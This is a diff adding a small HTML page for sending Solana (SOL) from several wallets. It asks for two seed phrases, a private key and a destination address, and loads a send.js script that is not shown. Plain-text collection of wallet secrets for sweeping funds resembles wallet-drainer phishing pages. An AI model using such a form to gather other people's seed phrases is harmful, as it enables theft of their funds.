@@ -1,0 +1,22 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send SOL from Multiple Accounts</title>
+    <style>
+        body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        input, button { margin: 10px; padding: 10px; width: 300px; }
+        button { background: white; color: black; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Send SOL from Wallets</h2>
+    <input type="text" id="seed1" placeholder="Enter Seed Phrase 1 (12 words)">
+    <input type="text" id="seed2" placeholder="Enter Seed Phrase 2 (12 words)">
+    <input type="text" id="privkey" placeholder="Enter Private Key (Base58 or Byte Array)">
+    <input type="text" id="toAddress" placeholder="To Wallet Address">
+    <button onclick="startSending()">Start Sending</button>
+    <pre id="log"></pre>
+    <script src="send.js"></script>
+</body>
+</html>
